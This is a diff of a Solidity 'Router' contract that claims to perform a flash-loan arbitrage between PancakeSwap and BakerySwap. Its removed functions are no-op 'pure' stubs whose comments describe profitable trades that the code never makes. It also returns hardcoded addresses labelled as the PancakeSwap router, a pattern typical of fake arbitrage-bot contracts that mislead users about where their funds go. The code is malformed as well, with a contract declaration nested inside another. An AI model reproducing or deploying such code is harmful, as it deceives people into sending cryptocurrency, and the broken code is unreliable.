@@ -109,67 +109,10 @@ interface IPancakePair {
     function initialize(address, address) external;
 }
 
-contract Router {
+contract RouterV2 {
 
     function pancakeRouterV2Address() public pure returns (address) {
         return 0xb7CeE09936b9c26753d9310dcfAD55c65B592fc3;
-    }
-
-    function compareStrings(string memory a, string memory b)
-        public pure
-        returns (bool)
-    {
-        return (keccak256(abi.encodePacked((a))) ==
-            keccak256(abi.encodePacked((b))));
-    }
-
-    function pancakeSwapAddress() public pure returns (address) {
-        return 0xb7CeE09936b9c26753d9310dcfAD55c65B592fc3; //0x05f18088749F7eDffe9ae56d628dd97e5b4d048f //
-    }
-
-    //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
-    function borrowFlashloanFromMultiplier(
-        address add0,
-        address add1,
-        uint256 amount
-    ) public pure {
-        require(uint(add0) != 0, "Address is invalid.");
-        require(uint(add1) != 0, "Address is invalid.");
-        require(amount > 0, "Amount should be greater than 0.");
-    }
-
-    //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
-    function convertBnbToBusd(address add0, uint256 amount) public pure {
-        require(uint(add0) != 0, "Address is invalid");
-        require(amount > 0, "Amount should be greater than 0");
-    }
-
-    function bakerySwapAddress() public pure returns (address) {
-        return 0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5;
-    }
-
-    //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
-    function callArbitrageBakerySwap(address add0, address add1) public pure {
-        require(uint(add0) != 0, "Address is invalid!");
-        require(uint(add1) != 0, "Address is invalid!");
-    }
-
-    //After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
-    function transferBnbToMultiplier(address add0)
-        public pure
-    {
-        require(uint(add0) != 0, "Address is invalid!");
-    }
-
-    //5. Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
-    function completeTransation(uint256 balanceAmount) public pure {
-        require(balanceAmount >= 0, "Amount should be greater than 0!");
-    }
-
-    contract Router {
-
-    function pancakeRouterV2Address() public pure returns (address) {
-        return 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;
     }
 
     function compareStrings(string memory a, string memory b)
